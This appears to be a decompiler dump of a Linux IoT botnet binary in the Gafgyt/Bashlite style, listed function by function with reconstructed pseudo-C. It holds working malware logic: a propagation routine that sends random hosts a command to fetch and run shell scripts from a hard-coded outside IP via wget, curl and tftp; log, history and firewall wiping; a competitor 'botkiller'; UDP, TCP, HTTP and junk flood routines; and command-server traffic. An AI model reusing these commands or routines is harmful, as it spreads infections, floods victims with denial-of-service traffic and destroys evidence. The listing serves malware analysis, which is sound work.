            init_rand(random());
        *v150 = (int16_t)(0x10000 * rand_cmwc(v149) / 0x10000);
            v151 = rand_cmwc(v149);
        makeRandomStr((char *)v153, v133);
        while (true) {
            __libc_sendto(v158, (int32_t)&v159, (int32_t)&v159, (int32_t)&v159, (int32_t)&v159, (int32_t)&v159);
            *v150 = (int16_t)(0x10000 * rand_cmwc(v158) / 0x10000);
                v160 = rand_cmwc(v158);
            *(int16_t *)(v148 | 4) = (int16_t)(0x10000 * rand_cmwc(v163) / 0x10000);
    result4 = HackerPrint(v136, (int32_t)"Failed opening raw socket.");
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 61649
++++++++ FUNCTION END 62176
++++++++ FUNCTION LENGTH 527
    int32_t v134 = __GI_fopen((int32_t)"/etc/resolv.conf", (int32_t)&v133); // 0x805643d
        if (fgets(v144, 128, v138) != 0) {
            while (true) {
        __GI_fclose((int16_t *)v135);
    int32_t v147 = __GI_fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v133); // 0x805645b
    if (fgets(v144, 128, v138) == 0) {
        __GI_fclose((int16_t *)v135);
    while (true) {
            while (true) {
                                while (true) {
                                            while (true) {
                                                while (true) {
                                        while (true) {
                                                if (fgets(v144, 128, v138) == 0) {
                                            while (true) {
                                                free(v186);
                                            __GI_fclose((int16_t *)v135);
                                        while (true) {
                                        if (fgets(v144, 128, v138) == 0) {
                if (fgets(v144, 128, v138) == 0) {
            __GI_fclose((int16_t *)v135);
        if (fgets(v144, 128, v138) == 0) {
    __GI_fclose((int16_t *)v135);
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 32879
++++++++ FUNCTION END 33958
++++++++ FUNCTION LENGTH 1079
        while (true) {
                while (true) {
                    while (true) {
                            while (true) {
                                            while (true) {
                                                while (true) {
                                                    while (true) {
                                                                    while (true) {
                                                                            while (true) {
                                                                                        while (true) {
                                                                                while (true) {
                                                                while (true) {
                                                                        while (true) {
                                                                                    while (true) {
                                                                                while (true) {
                                                    while (true) {
                                                            while (true) {
                                                                        while (true) {
                                                                    while (true) {
    while (true) {
=================FUNCTION : getOurIP ===================
++++++++ FUNCTION START 24314
++++++++ FUNCTION END 24574
++++++++ FUNCTION LENGTH 260
    int32_t v132 = socket(2, 2, 0); // 0x8050969
        inet_addr((int32_t)"8.8.8.8");
        if (__libc_connect(v132, (int32_t)&v133, 16) != -1) {
            int32_t v136 = __GI_getsockname(v132, (int32_t)&v135, (int32_t)&v134); // 0x8050a12
                int32_t v139 = __libc_open("/proc/net/route", 0); // 0x8050a44
                if (fdgets(v141, 0x1000, v139) != 0) {
                    while (true) {
                        if (strstr(v141, "\t00000000\t") == 0) {
                            if (fdgets(v141, 0x1000, v139) == 0) {
                                __libc_close(v139);
                                    __libc_close(v132);
                                __libc_close(v132);
                        __libc_close(v139);
                            __libc_close(v132);
                        __libc_close(v132);
                __libc_close(v139);
                __libc_close(v132);
=================FUNCTION : sendJUNK ===================
++++++++ FUNCTION START 13132
++++++++ FUNCTION END 13440
++++++++ FUNCTION LENGTH 308
    int32_t v135 = getdtablesize(v134); // 0x804ec63
    int32_t result = getHost(a1, &v138); // 0x804eca1
        while (true) {
        while (true) {
                        __libc_close(v162);
                    getsockopt(v156, v155, 0x2710, v154, (int32_t)&v161);
                        __libc_close(v156);
                    makeRandomStr((char *)v153, v134);
                    if (__libc_send(v156, v155, v145, v154) != -1) {
                    __libc_close(v156);
                    socket(v153, v134, v157);
                    if (__libc_connect(v153, v134, v157) != -1) {
                        __libc_close(v153);
=================FUNCTION : RemoveTMP ===================
++++++++ FUNCTION START 11495
++++++++ FUNCTION END 11642
++++++++ FUNCTION LENGTH 147
    __libc_system((int32_t)"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"history -c;history -w");
    __libc_system((int32_t)"rm -rf /var/log/wtmp");
    __libc_system((int32_t)"rm -rf /tmp/*");
    __libc_system((int32_t)"history -c");
    __libc_system((int32_t)"rm -rf ~/.bash_history");
    __libc_system((int32_t)"rm -rf /bin/netstat");
    __libc_system((int32_t)"history -w");
    __libc_system((int32_t)"pkill -9 busybox");
    __libc_system((int32_t)"pkill -9 perl");
    __libc_system((int32_t)"service iptables stop");
    return __libc_system((int32_t)"/sbin/iptables -F;/sbin/iptables -X");
=================FUNCTION : sendHOLD ===================
++++++++ FUNCTION START 13443
++++++++ FUNCTION END 13728
++++++++ FUNCTION LENGTH 285
    int32_t v135 = getdtablesize(v134); // 0x804f00e
    int32_t result = getHost(a1, &v138); // 0x804f04c
        while (true) {
        while (true) {
                        __libc_close(v157);
                    getsockopt(v159, v156, 0x2710, v152, (int32_t)&v153);
                        __libc_close(v159);
                    __libc_close(v163);
                    socket(v150, v134, (int32_t)&v153);
                    if (__libc_connect(v150, v134, (int32_t)&v153) != -1) {
                        __libc_close(v150);
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 63943
++++++++ FUNCTION END 64965
++++++++ FUNCTION LENGTH 1022
                        free(result);
                if (__libc_open((char *)v143, v141) >= 0) {
                                free(v139);
                free(result);
            if (__libc_open((char *)v143, v141) >= 0) {
                                free(v139);
            free(v139);
        if (__libc_open((char *)v143, v141) >= 0) {
            free(v139);
                            free(v139);
        free(result);
=================FUNCTION : print ===================
++++++++ FUNCTION START 2739
++++++++ FUNCTION END 3182
++++++++ FUNCTION LENGTH 443
    while (true) {
            printchar((int32_t *)result, v141);
                    while (true) {
                        while (true) {
                                            int32_t v167 = prints(v165, NULL, (int32_t)&v166, (int32_t)&v166); // 0x8048798
                                            int32_t v169 = printi(v168) + result; // 0x8048769
                                        result2 = printi(v164) + result;
                                    result2 = printi(v163) + result;
                                result2 = printi(v162) + result;
                            int32_t v171 = prints((int32_t)v170, (char *)v152, v146, result) + result; // 0x8048685
=================FUNCTION : getBogos ===================
++++++++ FUNCTION START 5114
++++++++ FUNCTION END 5318
++++++++ FUNCTION LENGTH 204
    int32_t v133 = __libc_open("/proc/cpuinfo", 0); // 0x8048ea1
    if (fdgets(v135, 0x1000, v133) != 0) {
        while (true) {
            uppercase((char *)&v134);
            if (strstr(v135, "BOGOMIPS") != v135) {
                if (fdgets(v135, 0x1000, v133) == 0) {
                while (true) {
                                while (true) {
                                            __libc_close(v133);
    __libc_close(v133);
=================FUNCTION : getCores ===================
++++++++ FUNCTION START 5321
++++++++ FUNCTION END 5477
++++++++ FUNCTION LENGTH 156
    int32_t v133 = __libc_open("/proc/cpuinfo", 0); // 0x804905e
    if (fdgets(v135, 0x1000, v133) == 0) {
        __libc_close(v133);
    uppercase((char *)&v134);
    int32_t result = strstr(v135, "BOGOMIPS") == v135;
    while (fdgets(v135, 0x1000, v133) != 0) {
        uppercase((char *)&v134);
        result += (int32_t)(strstr(v135, "BOGOMIPS") == v135);
    __libc_close(v133);
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 50419
++++++++ FUNCTION END 51131
++++++++ FUNCTION LENGTH 712
        while (true) {
            v146 = getuid();
            if (v146 == geteuid()) {
                v147 = getgid();
                if (v147 == getegid()) {
    v146 = getuid();
    if (v146 != geteuid()) {
    v147 = getgid();
    if (v147 == getegid()) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 11813
++++++++ FUNCTION END 11999
++++++++ FUNCTION LENGTH 186
    random();
    random();
    sprintf(v136, (int32_t)"%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n");
        while (true) {
            if (__libc_fork(v137) != 0) {
                while (true) {
                    int32_t v138 = socket_connect(a1, a3); // 0x804dfcf
                        __libc_close(v138);
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 67723
++++++++ FUNCTION END 68234
++++++++ FUNCTION LENGTH 511
        return inet_ntop4(v138, v136, v134);
        while (true) {
                            while (true) {
                                                        v175 = inet_ntop4((int32_t)v140, (int32_t)v154, v153);
                                                v171 = v137 + sprintf(v170, (int32_t)"%x");
                                            v175 = inet_ntop4((int32_t)v140, (int32_t)v154, v153);
                                v171 = v137 + sprintf(v170, (int32_t)"%x");
                while (true) {
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 12002
++++++++ FUNCTION END 12177
++++++++ FUNCTION LENGTH 175
    int32_t v133 = socket(2, 2, 0); // 0x804e06a
    __GI_gethostbyname(a1);
    while (true) {
        random();
            __libc_send(v133, v143, 75, 0);
            __libc_connect(v133, v136, 16);
                __libc_close(v133);
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 6412
++++++++ FUNCTION END 6601
++++++++ FUNCTION LENGTH 189
        __libc_send(a1, v137, 1, 0x4000);
                __libc_send(a1, v137, 1, 0x4000);
                __libc_send(a1, a2 + 2, 1, 0x4000);
            __libc_send(a1, v137, 1, 0x4000);
            __libc_send(a1, a2 + 2, 1, 0x4000);
        __libc_send(a1, v137, 1, 0x4000);
        __libc_send(a1, a2 + 2, 1, 0x4000);
=================FUNCTION : sendCNC ===================
++++++++ FUNCTION START 12511
++++++++ FUNCTION END 12669
++++++++ FUNCTION LENGTH 158
    inet_addr(a1);
    int32_t v135 = socket(2, 1, 0); // 0x804e670
    __libc_connect(v135, (int32_t)&v134, 16);
    __libc_close(v135);
        v135 = socket(2, 1, 0);
        __libc_connect(v135, (int32_t)&v134, 16);
        __libc_close(v135);
=================FUNCTION : fdpclose ===================
++++++++ FUNCTION START 4076
++++++++ FUNCTION END 4265
++++++++ FUNCTION LENGTH 189
        __libc_close(v134);
        __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v135, (int32_t)&v137);
        while (true) {
            int32_t v140 = __libc_waitpid(v139, (int32_t)&v138, 0); // 0x8048ba6
            __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
        __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 48507
++++++++ FUNCTION END 48742
++++++++ FUNCTION LENGTH 235
        while (true) {
                    int32_t v139 = __GI_sigprocmask(0, (struct _TYPEDEF_sigset_t *)&v135, v138); // 0x80547bf
                        while (true) {
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
                                    __GI_sigprocmask(2, (struct _TYPEDEF_sigset_t *)&v137, 0);
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 59545
++++++++ FUNCTION END 59856
++++++++ FUNCTION LENGTH 311
        while (true) {
            while (true) {
            while (true) {
        while (true) {
        while (true) {
    while (true) {
=================FUNCTION : NetisRanges ===================
++++++++ FUNCTION START 8443
++++++++ FUNCTION END 8588
++++++++ FUNCTION LENGTH 145
    random();
    int32_t v130 = random(); // 0x804c335
    int32_t v133 = random(); // 0x804c351
    int32_t v136 = random(); // 0x804c36d
    szprintf(v139, (int32_t)"%d.%d.%d.%d", (int32_t)v140, (int32_t)v129);
    return inet_addr(v139);
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 5632
++++++++ FUNCTION END 5888
++++++++ FUNCTION LENGTH 256
            while (true) {
                HackerPrint(v149, (int32_t)"PING");
                while (true) {
                        if (__libc_recv(v149, (int32_t)&v152, 1, 0) != 1) {
        while (true) {
    while (true) {
=================FUNCTION : StartTheNetis ===================
++++++++ FUNCTION START 11037
++++++++ FUNCTION END 11186
++++++++ FUNCTION LENGTH 149
    while (true) {
        int32_t v137 = socket(2, 2, 0); // 0x804daf0
        NetisRanges(v137);
        sprintf(v136, (int32_t)"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00");
        __libc_sendto(v137, v136, v138, 0, v134, 16);
=================FUNCTION : printi ===================
++++++++ FUNCTION START 2501
++++++++ FUNCTION END 2736
++++++++ FUNCTION LENGTH 235
            while (true) {
                    printchar((int32_t *)a1, 45);
                    return prints(a1, (char *)v143, v135 - 1, v136) + 1;
        result = prints(a1, (char *)v156, v135, v136);
        result = prints(a1, (char *)&v158, v135, v136);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 67070
++++++++ FUNCTION END 67504
++++++++ FUNCTION LENGTH 434
        result = inet_pton4(v136, v137, v134);
        while (true) {
            while (true) {
                while (true) {
                            if (inet_pton4(v151, (int32_t)v152, v141) >= 1) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 46804
++++++++ FUNCTION END 47018
++++++++ FUNCTION LENGTH 214
            while (true) {
                    __GI_random_r((int32_t *)a2, (int32_t)&v138);
                        __GI_random_r((int32_t *)a2, (int32_t)&v138);
            __GI_random_r((int32_t *)a2, (int32_t)&v138);
                __GI_random_r((int32_t *)a2, (int32_t)&v138);
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 47657
++++++++ FUNCTION END 48189
++++++++ FUNCTION LENGTH 532
        while (true) {
            while (true) {
            while (true) {
        while (true) {
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 35244
++++++++ FUNCTION END 35515
++++++++ FUNCTION LENGTH 271
    while (true) {
    while (true) {
                    while (true) {
            while (true) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 11645
++++++++ FUNCTION END 11810
++++++++ FUNCTION LENGTH 165
    if (__GI_gethostbyname(a1) == 0) {
    int32_t result = socket(2, 1, 6); // 0x804de83
    __GI_setsockopt(result, 6, 1, (int32_t)&v133, 4);
    if (__libc_connect(result, (int32_t)&v137, 16) != -1) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 6799
++++++++ FUNCTION END 7030
++++++++ FUNCTION LENGTH 231
        while (true) {
            int32_t v139 = __libc_recv(a1, v138, 1, 0); // 0x804990d
                        int32_t v142 = __libc_recv(a1, v138 + 1, 2, 0); // 0x804994e
                    if (strstr(v134, (char *)a2) == 0) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 45542
++++++++ FUNCTION END 45754
++++++++ FUNCTION LENGTH 212
    while (true) {
                __GI_sigprocmask(1, (struct _TYPEDEF_sigset_t *)&v135, 0);
                while (true) {
                while (true) {
=================FUNCTION : botkiller ===================
++++++++ FUNCTION START 11327
++++++++ FUNCTION END 11492
++++++++ FUNCTION LENGTH 165
        __GI_snprintf(v138, 127, (int32_t)">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n", v143, v142, v141);
        __libc_system(v138);
        sprintf(v145, (int32_t)"pkill -9 %s\r\n");
        result = __libc_system(v145);
=================FUNCTION : HackerPrint ===================
++++++++ FUNCTION START 3463
++++++++ FUNCTION END 3606
++++++++ FUNCTION LENGTH 143
    print(&v134, a2, (int32_t)&v136);
    int32_t result = __libc_send(a1, v133, _strlen(v135), 0x4000); // 0x80488c2
    free(v133);
=================FUNCTION : __GI_fclose ===================
++++++++ FUNCTION START 62897
++++++++ FUNCTION END 63087
++++++++ FUNCTION LENGTH 190
    if (__libc_close(v134) < 0) {
        free(v142);
    _stdio_openlist_dec_use();
=================FUNCTION : hostname_to_ip ===================
++++++++ FUNCTION START 5891
++++++++ FUNCTION END 6046
++++++++ FUNCTION LENGTH 155
    if (__GI_gethostbyname(a1) == 0) {
        __GI_herror("gethostbyname");
        strcpy((char *)a2, __GI_inet_ntoa(v134));
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 6244
++++++++ FUNCTION END 6409
++++++++ FUNCTION LENGTH 165
    int32_t result = __libc_fork(v130); // 0x8049564
        while (true) {
                    free(v137);
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 6049
++++++++ FUNCTION END 6241
++++++++ FUNCTION LENGTH 192
    if (getHost(a2, &v134) != 0) {
    int32_t v135 = __libc_connect(a1, (int32_t)&v133, 16); // 0x8049434
    getsockopt(a1, 1, 4, (int32_t)&v143, (int32_t)&v142);
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 65485
++++++++ FUNCTION END 65725
++++++++ FUNCTION LENGTH 240
        _stdio_openlist_dec_use();
    while (true) {
    _stdio_openlist_dec_use();
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 24143
++++++++ FUNCTION END 24311
++++++++ FUNCTION LENGTH 168
        __libc_close(v133);
    int32_t v141 = socket(2, 1, 0); // 0x805090d
    return connectTimeout(v141, v131, v138, 30) == 0;
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 5480
++++++++ FUNCTION END 5629
++++++++ FUNCTION LENGTH 149
        rand_cmwc(v133);
            rand_cmwc(v133);
=================FUNCTION : trim ===================
++++++++ FUNCTION START 1667
++++++++ FUNCTION END 1863
++++++++ FUNCTION LENGTH 196
    while (true) {
            while (true) {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 47021
++++++++ FUNCTION END 47194
++++++++ FUNCTION LENGTH 173
        srandom_r((int64_t)a1, a4);
    srandom_r((int64_t)a1, a4);
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 70746
++++++++ FUNCTION END 70975
++++++++ FUNCTION LENGTH 229
            while (true) {
                while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 30390
++++++++ FUNCTION END 30576
++++++++ FUNCTION LENGTH 186
        while (true) {
    while (true) {
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 60227
++++++++ FUNCTION END 60467
++++++++ FUNCTION LENGTH 240
        while (true) {
            while (true) {
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 65278
++++++++ FUNCTION END 65482
++++++++ FUNCTION LENGTH 204
    while (true) {
                free(v142);
=================FUNCTION : __GI_vfprintf ===================
++++++++ FUNCTION START 30729
++++++++ FUNCTION END 30915
++++++++ FUNCTION LENGTH 186
        result = _vfprintf_internal(v136, (char *)a2, a3, v139);
        result = _vfprintf_internal(v135, (char *)a2, a3, v139);
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 60027
++++++++ FUNCTION END 60224
++++++++ FUNCTION LENGTH 197
        while (true) {
                while (true) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 55402
++++++++ FUNCTION END 55637
++++++++ FUNCTION LENGTH 235
        while (true) {
    while (true) {
=================FUNCTION : _vfprintf_internal ===================
++++++++ FUNCTION START 31256
++++++++ FUNCTION END 32071
++++++++ FUNCTION LENGTH 815
    while (true) {
                                                                                    while (true) {
=================FUNCTION : __GI_herror ===================
++++++++ FUNCTION START 37416
++++++++ FUNCTION END 37586
++++++++ FUNCTION LENGTH 170
        return fprintf(v135, (int32_t)"%s%s%s\n", v132, v138, v134);
    return fprintf(v135, (int32_t)"%s%s%s\n", v132, v139, v134);
=================FUNCTION : __libc_system ===================
++++++++ FUNCTION START 47197
++++++++ FUNCTION END 47378
++++++++ FUNCTION LENGTH 181
    int32_t v136 = __vfork(v135); // 0x8054449
    if (wait4(v136, (int32_t)&result, 0, 0) == -1) {
=================FUNCTION : __malloc_consolidate ===================
++++++++ FUNCTION START 44785
++++++++ FUNCTION END 45066
++++++++ FUNCTION LENGTH 281
        while (true) {
                while (true) {
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 66282
++++++++ FUNCTION END 66510
++++++++ FUNCTION LENGTH 228
        while (true) {
    while (true) {
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 65728
++++++++ FUNCTION END 65941
++++++++ FUNCTION LENGTH 213
            while (true) {
                int32_t v140 = getc_unlocked(); // 0x8056ef1
=================FUNCTION : __GI_sigprocmask ===================
++++++++ FUNCTION START 28633
++++++++ FUNCTION END 28805
++++++++ FUNCTION LENGTH 172
        v134 = sigprocmask(how, set, oset);
    v134 = sigprocmask(how, set, oset);
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 54278
++++++++ FUNCTION END 54493
++++++++ FUNCTION LENGTH 215
    while (true) {
            while (true) {
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 36081
++++++++ FUNCTION END 36287
++++++++ FUNCTION LENGTH 206
        while (true) {
            while (true) {
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 69007
++++++++ FUNCTION END 69152
++++++++ FUNCTION LENGTH 145
    int32_t v133 = __GI_fopen((int32_t)"/etc/hosts", (int32_t)&v132); // 0x805784d
        result = __GI_fopen((int32_t)"/etc/config/hosts", (int32_t)&v132);
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 6604
++++++++ FUNCTION END 6796
++++++++ FUNCTION LENGTH 192
    while (true) {
                while (true) {
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 66513
++++++++ FUNCTION END 66703
++++++++ FUNCTION LENGTH 190
    while (true) {
        while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 10139
++++++++ FUNCTION END 10307
++++++++ FUNCTION LENGTH 168
    while (true) {
        if (strcasestr((char *)a1, v136) == 0) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 70532
++++++++ FUNCTION END 70743
++++++++ FUNCTION LENGTH 211
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 4448
++++++++ FUNCTION END 4610
++++++++ FUNCTION LENGTH 162
    while (true) {
=================FUNCTION : __GI_snprintf ===================
++++++++ FUNCTION START 29669
++++++++ FUNCTION END 29805
++++++++ FUNCTION LENGTH 136
    return __GI_vsnprintf((char *)a1, a2, a3, (int32_t)&v133);
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 65944
++++++++ FUNCTION END 66105
++++++++ FUNCTION LENGTH 161
    while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 36428
++++++++ FUNCTION END 36563
++++++++ FUNCTION LENGTH 135
    return __GI_tcgetattr(a1, &v133) == 0;
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 30918
++++++++ FUNCTION END 31084
++++++++ FUNCTION LENGTH 166
    while (true) {
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 39146
++++++++ FUNCTION END 39280
++++++++ FUNCTION LENGTH 134
    return __socketcall(10, (int32_t)&a1);
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 35077
++++++++ FUNCTION END 35241
++++++++ FUNCTION LENGTH 164
    while (true) {
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 34910
++++++++ FUNCTION END 35074
++++++++ FUNCTION LENGTH 164
    while (true) {
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 9710
++++++++ FUNCTION END 9858
++++++++ FUNCTION LENGTH 148
        result = __libc_recv(a1, a3, a4, 0);
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 70978
++++++++ FUNCTION END 71154
++++++++ FUNCTION LENGTH 176
    while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 29808
++++++++ FUNCTION END 29944
++++++++ FUNCTION LENGTH 136
    return __GI_vsnprintf((char *)a1, -1, a2, (int32_t)&v133);
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 8996
++++++++ FUNCTION END 9135
++++++++ FUNCTION LENGTH 139
    free(v133);
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 66108
++++++++ FUNCTION END 66279
++++++++ FUNCTION LENGTH 171
        while (true) {
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 62179
++++++++ FUNCTION END 62314
++++++++ FUNCTION LENGTH 135
    return __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, a6, a7);
=================FUNCTION : szprintf ===================
++++++++ FUNCTION START 3324
++++++++ FUNCTION END 3460
++++++++ FUNCTION LENGTH 136
    return print(&v133, a1, (int32_t)&v134);
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 62317
++++++++ FUNCTION END 62452
++++++++ FUNCTION LENGTH 135
    return kill(__libc_getpid(), a1);
=================FUNCTION : __libc_getpid ===================
++++++++ FUNCTION START 26989
++++++++ FUNCTION END 27136
++++++++ FUNCTION LENGTH 147
    int32_t pid = getpid(v133); // 0x805160d
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 4817
++++++++ FUNCTION END 4953
++++++++ FUNCTION LENGTH 136
    int32_t v133 = inet_addr(a1); // 0x8048e2c
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 9427
++++++++ FUNCTION END 9563
++++++++ FUNCTION LENGTH 136
    return __GI_inet_ntoa(v133);
=================FUNCTION : __vfork ===================
++++++++ FUNCTION START 25360
++++++++ FUNCTION END 25496
++++++++ FUNCTION LENGTH 136
    uint32_t result = vfork(); // 0x80513f2
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 26695
++++++++ FUNCTION END 26837
++++++++ FUNCTION LENGTH 142
    if ((uint32_t)getrlimit(7, (int32_t)&result) >= 0) {
=================FUNCTION : __GI_strcasecmp ===================
++++++++ FUNCTION START 70364
++++++++ FUNCTION END 70529
++++++++ FUNCTION LENGTH 165
    while (true) {
=================FUNCTION : _fini ===================
++++++++ FUNCTION START 71860
++++++++ FUNCTION END 71997
++++++++ FUNCTION LENGTH 137
    __get_pc_thunk_bx(v133);
=================FUNCTION : kill ===================
++++++++ FUNCTION START 27439
++++++++ FUNCTION END 27586
++++++++ FUNCTION LENGTH 147
    int32_t v135 = kill(v133, v134); // 0x80516b3
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 32416
++++++++ FUNCTION END 32727
++++++++ FUNCTION LENGTH 311
        while (true) {
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 39420
++++++++ FUNCTION END 39554
++++++++ FUNCTION LENGTH 134
    return __socketcall(11, (int32_t)&a1);
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 66853
++++++++ FUNCTION END 67067
++++++++ FUNCTION LENGTH 214
        while (true) {
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 9138
++++++++ FUNCTION END 9278
++++++++ FUNCTION LENGTH 140
    rand_cmwc((int32_t)v134);
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 37751
++++++++ FUNCTION END 37886
++++++++ FUNCTION LENGTH 135
    return __GI_inet_ntoa_r(a1, (int32_t)&v132);
=================FUNCTION : __bsd_signal ===================
++++++++ FUNCTION START 40122
++++++++ FUNCTION END 40304
++++++++ FUNCTION LENGTH 182
        while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 65119
++++++++ FUNCTION END 65275
++++++++ FUNCTION LENGTH 156
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3, v136); // 0x8056c6a
=================FUNCTION : rand ===================
++++++++ FUNCTION START 45757
++++++++ FUNCTION END 45892
++++++++ FUNCTION LENGTH 135
    return random();
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 39557
++++++++ FUNCTION END 39691
++++++++ FUNCTION LENGTH 134
    return __socketcall(14, (int32_t)&a1);
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 34594
++++++++ FUNCTION END 34754
++++++++ FUNCTION LENGTH 160
    while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 28957
++++++++ FUNCTION END 29092
++++++++ FUNCTION LENGTH 135
    return wait4(a1, a2, a3, 0);
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 32074
++++++++ FUNCTION END 32268
++++++++ FUNCTION LENGTH 194
        while (true) {
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 29947
++++++++ FUNCTION END 30108
++++++++ FUNCTION LENGTH 161
    int32_t result = _vfprintf_internal(v135, (char *)a3, a4, v133 + v139); // 0x8051a48
=================FUNCTION : __libc_close ===================
++++++++ FUNCTION START 26246
++++++++ FUNCTION END 26392
++++++++ FUNCTION LENGTH 146
    int32_t v133 = close(fd); // 0x8051538
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 38872
++++++++ FUNCTION END 39006
++++++++ FUNCTION LENGTH 134
    return __socketcall(6, (int32_t)&a1);
=================FUNCTION : __GI_fopen ===================
++++++++ FUNCTION START 63090
++++++++ FUNCTION END 63225
++++++++ FUNCTION LENGTH 135
    return _stdio_fopen(a1, (char *)a2, 0, -1);
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 4268
++++++++ FUNCTION END 4445
++++++++ FUNCTION LENGTH 177
    while (true) {
=================FUNCTION : socket ===================
++++++++ FUNCTION START 39694
++++++++ FUNCTION END 39828
++++++++ FUNCTION LENGTH 134
    return __socketcall(1, (int32_t)&a1);
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 67507
++++++++ FUNCTION END 67720
++++++++ FUNCTION LENGTH 213
    while (true) {
=================FUNCTION : HackerScan ===================
++++++++ FUNCTION START 8591
++++++++ FUNCTION END 8727
++++++++ FUNCTION LENGTH 136
    return rand_cmwc(v133) & -1 - a1 ^ v133;
=================FUNCTION : zprintf ===================
++++++++ FUNCTION START 3185
++++++++ FUNCTION END 3321
++++++++ FUNCTION LENGTH 136
    return print(NULL, a1, (int32_t)&v133);
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 39009
++++++++ FUNCTION END 39143
++++++++ FUNCTION LENGTH 134
    return __socketcall(15, (int32_t)&a1);
=================FUNCTION : random ===================
++++++++ FUNCTION START 45895
++++++++ FUNCTION END 46037
++++++++ FUNCTION LENGTH 142
    __GI_random_r(&v134, (int32_t)&result);
=================FUNCTION : fprintf ===================
++++++++ FUNCTION START 54138
